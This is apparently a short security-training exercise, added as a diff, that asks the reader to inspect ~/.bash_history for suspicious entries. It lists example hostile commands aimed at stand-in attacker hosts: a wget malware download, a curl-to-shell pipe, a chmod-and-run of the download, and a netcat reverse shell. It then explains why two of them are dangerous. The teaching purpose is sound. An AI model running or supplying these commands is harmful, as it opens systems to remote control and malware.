@@ -1,0 +1,22 @@
+Open the .bash_history file:
+
+
+cat ~/.bash_history
+Look for commands like:
+
+wget http://malicious-site.com/malware.sh
+
+nc -e /bin/sh attacker_ip 4444
+
+curl http://bad-site.com/script.sh | sh
+
+chmod +x malware.sh && ./malware.sh
+
+Pick two suspicious commands and explain briefly:
+
+Example:
+Command 1: wget http://malicious-site.com/malware.sh
+Why dangerous: Downloads potentially malicious scripts or files from an untrusted source.
+
+Command 2: nc -e /bin/sh attacker_ip 4444
+Why dangerous: Opens a reverse shell connection, giving remote attacker control over the system.
